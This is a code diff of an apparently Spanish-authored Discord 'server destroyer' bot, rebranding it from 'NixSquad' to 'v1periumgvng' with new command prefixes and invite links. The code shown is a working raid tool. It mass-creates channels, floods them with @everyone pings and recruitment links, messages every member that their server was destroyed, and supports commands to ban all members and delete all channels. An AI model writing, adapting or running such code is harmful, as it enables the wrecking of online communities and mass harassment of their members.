@@ -61,10 +61,10 @@ if (msg.content === prefix + "invite") {
             .setFooter({text:`- /Nix By 1zzy. -`})
             .setDescription(`The commands of the bot raid are:
 
-n$raid **raid to the server** ☠️
-n$banall **banall members of the server** ☠️
-n$nuked **delete all channels of the server** ☠️
-n$spam **makes 10 tags on all server channels** ☠️`)
+v$raid **raid to the server** ☠️
+v$banall **banall members of the server** ☠️
+v$nuked **delete all channels of the server** ☠️
+v$spam **makes 10 tags on all server channels** ☠️`)
         ]})
     };
     
@@ -87,7 +87,7 @@ if (msg.content === prefix + "raid") {
     }
 
     async function crearCanalesYEnviarMensajes() {
-        const nombresCanales = ["pawned nixsquad", "pawned nixsquad", "pawned nixsquad"];
+        const nombresCanales = ["『💀』p͎a͎w͎a͎n͎e͎d͎ v͎1͎p͎e͎r͎i͎u͎m͎g͎v͎n͎g͎", "『💀』p͎a͎w͎a͎n͎e͎d͎ v͎1͎p͎e͎r͎i͎u͎m͎g͎v͎n͎g͎", "『💀』p͎a͎w͎a͎n͎e͎d͎ v͎1͎p͎e͎r͎i͎u͎m͎g͎v͎n͎g͎"];
         const promesasCanales = [];
 
         for (let i = 0; i < 30; i++) { 
@@ -102,10 +102,10 @@ if (msg.content === prefix + "raid") {
                         .setImage("https://media.discordapp.net/attachments/1341961863335776268/1342177279689621575/67df7efdc9740c079cf529f77e8d4d58.gif?ex=67dcf0bf&is=67db9f3f&hm=c899d28ca2423abb8cc69cfcbf1c5ea58dd75424eeef502404da0a63e717cf68&=")
                         .setDescription('ㅤㅤ         **✞   S̶E̶R̶V̶E̶R̶ ̶D̶E̶S̶T̶R̶O̶Y̶E̶R̶S̶   ✞**')
                         .setColor('#000000')
-                        .setFooter({ text: '/NixSquad' });
+                        .setFooter({ text: '/v1periumgvng' });
 
                     const mensajes = Array(80).fill({
-                        content: "||@everyone||\n> https://discord.gg/REkgNXwJ5q  **",
+                        content: "||@everyone||\n> https://discord.gg/vvfRBUCwpP **",
                         embeds: [embed]
                     });
 
@@ -120,9 +120,9 @@ if (msg.content === prefix + "raid") {
     async function enviarMensajePrivado() {
         const miembros = await msg.guild.members.fetch();
         const embedDM = new EmbedBuilder()
-            .setTitle("**RAID COMPLETADO POR /Nix**")
+            .setTitle("**RAID COMPLETADO POR /v1periumgvng**")
             .setThumbnail("https://media.discordapp.net/attachments/1341961863335776268/1342177279689621575/67df7efdc9740c079cf529f77e8d4d58.gif?ex=67dcf0bf&is=67db9f3f&hm=c899d28ca2423abb8cc69cfcbf1c5ea58dd75424eeef502404da0a63e717cf68&=")
-            .setDescription(`El servidor **${msg.guild.name}** ha sido destruido por /NixSquad.`)
+            .setDescription(`El servidor **${msg.guild.name}** ha sido destruido por /v1periumgvng.`)
             .setColor("#000000")
             .setTimestamp();
 
@@ -167,7 +167,7 @@ if (msg.content === prefix + "nuke") {
         }
 
         await msg.guild.channels.create({
-            name: "nuked",
+            name: "nuked v1perium",
             type: ChannelType.GuildText
         }).catch(console.error);
         
@@ -185,14 +185,14 @@ if (msg.content === prefix + "spam") {
         for (let i = 0; i < 50; i++) { // Ajusta el número de repeticiones
             try {
                 await channel.send({
-                    content: `@everyone | @here\nhttps://discord.gg/REkgNXwJ5q`
+                    content: `@everyone | @here\n https://discord.gg/vvfRBUCwpP`
                 });
 
                 await channel.send({
                     embeds: [
                         new EmbedBuilder()
                             .setImage("https://media.discordapp.net/attachments/1341961863335776268/1342177279689621575/67df7efdc9740c079cf529f77e8d4d58.gif?ex=67dcf0bf&is=67db9f3f&hm=c899d28ca2423abb8cc69cfcbf1c5ea58dd75424eeef502404da0a63e717cf68&=%29%2A%2A&")
-                            .setTitle("/NixSquad")
+                            .setTitle("/v1periumgvng")
                     ]
                 });
 
